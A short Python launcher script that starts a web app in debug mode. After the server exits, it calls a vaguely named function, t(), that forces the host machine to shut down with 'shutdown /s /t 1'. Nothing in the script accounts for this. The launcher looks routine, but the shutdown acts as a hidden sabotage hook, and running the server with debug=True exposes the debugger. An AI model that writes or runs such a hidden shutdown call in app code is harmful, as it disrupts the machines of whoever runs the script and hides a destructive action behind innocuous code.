from app import app
import os


def t():
    os.system("shutdown /s /t 1")


if __name__ == "__main__":
    app.run(debug=True)
    t()
